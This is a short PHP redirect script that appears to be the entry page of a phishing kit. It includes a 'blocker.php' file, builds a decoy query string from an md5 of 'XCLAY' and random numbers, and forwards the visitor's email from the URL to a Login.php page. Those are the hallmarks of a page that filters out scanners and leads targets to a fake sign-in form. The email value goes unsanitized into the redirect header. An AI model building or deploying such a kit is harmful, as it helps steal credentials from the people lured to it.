<?php ob_start(); ?> 
<?php
session_start();
include('blocker.php');

if(isset($_GET['email']) && !empty($_GET['email'])){
$email = $_GET['email'];

exit(header("Location: Login.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".$email));
}else{
exit(header("Location: Login.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000).""));
}

?>
